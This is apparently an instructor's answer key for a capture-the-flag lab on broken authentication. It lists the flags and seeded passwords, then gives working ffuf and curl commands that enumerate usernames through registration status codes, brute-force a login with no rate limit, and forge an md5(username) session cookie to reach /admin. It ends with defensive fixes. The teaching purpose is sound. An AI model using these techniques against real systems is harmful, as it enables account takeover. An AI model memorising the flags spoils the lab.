# Solution & Answer Key — Broken Authentication (Part 1)

> Every step below was tested against this app and works.

## Flags (2)

| # | Flag | Where it's handed over |
|---|------|------------------------|
| 1 | `FLAG{auth_bruteforce_no_rate_limit}` | bob's `/dashboard`, after cracking his password |
| 2 | `FLAG{auth_forged_session_md5_username}` | `/admin`, when the session resolves to an admin |

Flags are fixed strings, independent marks — accept either regardless of the path.

## Seeded accounts (what students can't see directly)

| username | password | role | crackable? |
|---|---|---|---|
| `dd_root_07` | `Zx9#Qv!m2_Lp7` | admin | **no** (not on any wordlist — by design) |
| `alice` | `sunshine` | user | yes |
| `bob` | `qwerty` | user | yes (the intended foothold) |
| `charlie` | `password1` | user | yes |
| `dave` | `letmein` | user | yes |
| `support` | `monkey` | support | yes |
| `student` | `student123` | user | yes (open-day demo, given to students) |

The admin password is deliberately uncrackable so students **cannot** shortcut
the session-forgery step by guessing it.

---

## The intended chain

```
register-form enumeration (finds bob AND dd_root_07)  ->  brute-force bob
->  realise sid = md5(username)  ->  forge md5("dd_root_07")  ->  /admin
```

### Step 1 — Username enumeration via `/register`

The registration endpoint answers with a **different HTTP status** for a taken
username (`409 Conflict`) versus a free one (`201 Created`). That status is the
enumeration oracle — match on it with ffuf:

```bash
ffuf -w usernames.txt -u http://localhost:3000/register \
     -X POST -d "username=FUZZ&password=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mc 409 -c                # 409 = username already exists
```

`-mc 409` lists exactly the usernames that exist. You'll find
`alice, bob, charlie, dave, support, student, dd_root_07`, etc.

> Side effect: fuzzing `/register` also *creates* an account for every username
> that was free (those return `201`). Harmless in the lab (restart to reset); the
> `409` hits are the signal you want.

Manual check:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST -d "username=bob&password=x" http://localhost:3000/register
# -> 409      (a free name returns 201)
```

> Note the contrast to teach: **login** stays generic (`401` for any bad attempt,
> no "no such user") — it does *not* leak. The signup form is the leak. Same app,
> one endpoint done right and one done wrong.

### Step 2 — Brute-force bob (no rate limit)

Login has no lockout and no delay, so a small wordlist cracks the weak password.
A correct password returns `200`; every wrong attempt returns `401`:

```bash
ffuf -w passwords.txt -u http://localhost:3000/login \
     -X POST -d "username=bob&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mc 200 -c                # or: -fc 401  (filter the failures out)
# the hit is password=qwerty
```

(Students can also script it with curl in a `while read` loop over `passwords.txt`.)

Sign in as `bob / qwerty` and open `/dashboard`:

```
FLAG{auth_bruteforce_no_rate_limit}      <-- Flag 1
```

### Step 3 — Discover the session scheme

After logging in, look at the `sid` cookie (DevTools → Application → Cookies, or
the `Set-Cookie` header). For bob it is:

```
sid = 9f9d51bc70ef21ca5c14f307980a29d8
```

It *looks* random (32 hex chars) but it's `md5("bob")`:

```bash
echo -n "bob" | md5sum
# 9f9d51bc70ef21ca5c14f307980a29d8   <-- identical
```

**The session id is just `md5(username)`.** So if you know any username, you can
forge that user's session with no password at all.

### Step 4 — Find the admin's username

No new endpoint needed: the admin's username already fell out of the Step 1
enumeration. `usernames.txt` contains `dd_root_07`, and `/register` confirmed it
is taken. The `root`-flavoured name is the tell — it's the administrator.

If a student wants certainty rather than inference, they can forge a session for
each enumerated username in turn and hit `/admin`; only the admin's resolves to
the flag (everyone else gets 403). Either way the target is `dd_root_07`.

> Note: the member directory at `/members` is **admin-only in both modes** — a
> regular user gets 403. That is deliberate. A normal user being able to read it
> would be a *Broken Access Control* bug (OWASP A01), which is Part 2's topic,
> not this week's. Part 1 stays purely about authentication.

### Step 5 — Forge the admin session → `/admin`

Compute `md5("dd_root_07")` and set it as your `sid` cookie:

```bash
printf '%s' "dd_root_07" | md5sum
# 2f3669adcba11b12a1086564f41d7e2d

curl -s -b "sid=2f3669adcba11b12a1086564f41d7e2d" http://localhost:3000/admin | grep -o 'FLAG{[^}]*}'
# FLAG{auth_forged_session_md5_username}      <-- Flag 2
```

In the browser: DevTools → Application → Cookies → set
`sid = 2f3669adcba11b12a1086564f41d7e2d`, then visit `/admin`.

### Stretch — Blast radius (exercise, no flag)

From your Step-1 enumeration you already have every username (and `/members`
confirms them once you're admin). Re-run the step-2 brute-force per user over
`passwords.txt` and you crack `alice, charlie, dave, support, student` too.
The lesson: one weak password + a predictable session scheme compromises the
entire user base. `dd_root_07` never falls to guessing — only to the md5 forge.

---

## The Fix (run `SECURE=1 node server.js` and re-test)

| Vulnerability | Fix in SECURE mode | Why it works |
|---|---|---|
| **Username enumeration** (`/register` leaks "taken") | Return a generic response that doesn't confirm existence + rate-limit the endpoint per IP | The oracle disappears; the attacker can't tell a real username from a fake one |
| **No brute-force protection** (`/login`) | Lock the account after 5 failed attempts for a cooldown window + generic error | Online guessing becomes infeasible; even the *correct* password is refused while locked |
| **Predictable session** (`sid = md5(username)`) | Mint a cryptographically-random token at login (`crypto.randomBytes`) and store it server-side; identify requests by that lookup | `md5(username)` resolves to nobody — the session is no longer a function of the username, so it can't be forged |

### Verified SECURE-mode behaviour

- Forged `sid=md5("dd_root_07")` → `/admin` returns **401** (doesn't resolve).
- `/register` on an existing name → **200**, identical to a free name (no `409`
  oracle), so `-mc 409` returns nothing — enumeration is dead.
- 5 bad logins → account locked (**429**); the correct password is then also
  refused with `429`, so `-mc 200` never fires — brute-force stalls.
- `alice` logs in → `sid` is a random 48-hex token, **not** `md5("alice")`.
- `/members` as a non-admin → **403** (both modes — it is correctly admin-only).

### Status-code map (why this app is ffuf-friendly)

Every auth response renders inline with a meaningful status — no 302 redirects —
so a fuzzer matches on the code, not the body:

| Code | Meaning |
|---|---|
| `200` | login success / page OK |
| `201` | registration created a new account |
| `400` | missing username or password |
| `401` | bad credentials, or not signed in |
| `403` | signed in but wrong role (e.g. non-admin at `/members`, `/admin`) |
| `409` | username already taken (the enumeration signal) |
| `429` | rate-limited / account locked (SECURE mode) |

### The one-line takeaways for the board

1. **Never let error messages confirm what exists** (users, emails, files).
2. **Rate-limit / lock out** anything guessable.
3. **Session tokens must be random and server-side** — never a function of
   anything the user knows or controls.
4. **Authorisation data lives on the server**, not in a cookie the client holds.

---

## Teardown / reset

In-memory data resets on every restart. If a port is stuck on Windows:

```powershell
Get-NetTCPConnection -LocalPort 3000 -State Listen |
  ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }
```
